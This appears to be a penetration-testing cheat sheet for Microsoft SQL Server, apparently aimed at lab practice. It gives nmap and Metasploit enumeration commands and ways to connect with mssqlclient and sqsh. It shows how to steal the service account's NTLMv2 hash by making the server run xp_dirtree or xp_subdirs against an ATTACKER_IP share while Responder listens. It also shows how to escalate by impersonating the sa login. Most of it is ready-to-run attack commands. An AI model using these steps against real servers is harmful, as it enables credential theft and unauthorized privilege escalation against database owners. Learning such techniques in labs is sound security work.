
## Footprinting the Service

### Using NMAP

```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET IP>
```

### Using METASPLOIT

```bash
msfconsole
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS <TARGET IP>
run
```

## Connect to MSSQL

```bash
python3 mssqlclient.py <username>@<TARGET IP> -windows-auth
```

**OR**

- If we use `sqlcmd` command then we need to use `GO` after every query.
- `sqsh` is an alternative to `sqlcmd`.

```bash
sqsh -S <SERVER_NAME> -U <USERNAME> -P '<PASSWORD>' 
```

**OR**

- By Default in port `1433` but based on the port where MSSQL runs use that in place of `1433`.
- If it doesn't work, append `-windows-auth` at the last , when the account you are logging with is a service account.

```bash
impacket-mssqlclient -p 1433 <USERNAME>@<SERVER_IP>
```


## Capture MSSQL Service Hash

### ATTACK LOGIC

1. **The Trick:** You tell the SQL server, _"Hey, go look at the files inside `\\YOUR-ATTACKER-IP\share`."_
2. **The Knock:** The SQL server connects to your attacking machine (where you have a tool like `Responder` or `smbserver.py` running).
3. **The Handshake:** Your attacking machine says, _"Sure, you can look at my files, but you need to tell me who you are first."_
4. **The Theft:** The SQL server automatically replies by handing over its **NTLMv2 username and password hash** to prove its identity.


#### XP_SUBDIRS Hash Stealing with Responder

- Need to start the `responder` first because we need to actively listen or accept connections so that we can capture the hash of the service account.

```mysql
sudo responder -I <network_interface> # for example eth0 wlan0 tun0(for htb)
```

#### XP_DIRTREE Hash Stealing

```mysql
1> EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
2> GO
```

**OR**
#### XP_SUBDIRS Hash Stealing

```mysql
1> EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\'
2> GO
```




## Impersonate Existing Users with MSSQL

### Identify Users that We Can Impersonate

- Identify the list of user/users you can impersonate.

```mysql
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

### Verifying our Current User and Role

- Check your current database instance user and its role.

```mysql
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

### Impersonating System Administrator(SA) User

- During identification of users we can impersonate we find that we can impersonate the `system administrator(SA)` user, we can use the below command to do that.

```mysql
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```


## MSSQL Commands

| SQL Query                                           | Purpose                         |
| --------------------------------------------------- | ------------------------------- |
| `SELECT name FROM sys.databases;`                   | List all databases              |
| `SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;` | List tables in current database |
| `SELECT SYSTEM_USER;`                               | Check SQL login (server level)  |
| `SELECT USER_NAME();`                               | Check database user (DB level)  |
